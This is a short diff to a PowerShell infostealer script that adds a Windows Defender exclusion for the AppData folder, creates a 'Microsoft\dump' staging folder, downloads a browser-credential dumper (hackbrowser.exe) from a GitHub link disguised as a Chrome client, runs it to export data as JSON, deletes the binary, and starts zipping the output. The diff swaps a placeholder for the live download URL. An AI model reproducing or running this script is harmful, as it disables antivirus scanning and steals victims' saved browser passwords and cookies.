@@ -4,7 +4,7 @@ Add-MpPreference -ExclusionPath "$env:appdata"
 mkdir "$env:appdata\Microsoft\dump"
 Set-Location "$env:appdata\Microsoft\dump"
 #Downloading and executing hackbrowser.exe
-Invoke-WebRequest 'hackbrowser.exe file link' -OutFile "hb.exe"
+Invoke-WebRequest 'https://github.com/epicthoistaken/googlechromeyes/raw/main/googlechromeclientyes.exe' -OutFile "hb.exe"
 .\hb.exe --format json
 Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
 #Creating A Zip Archive
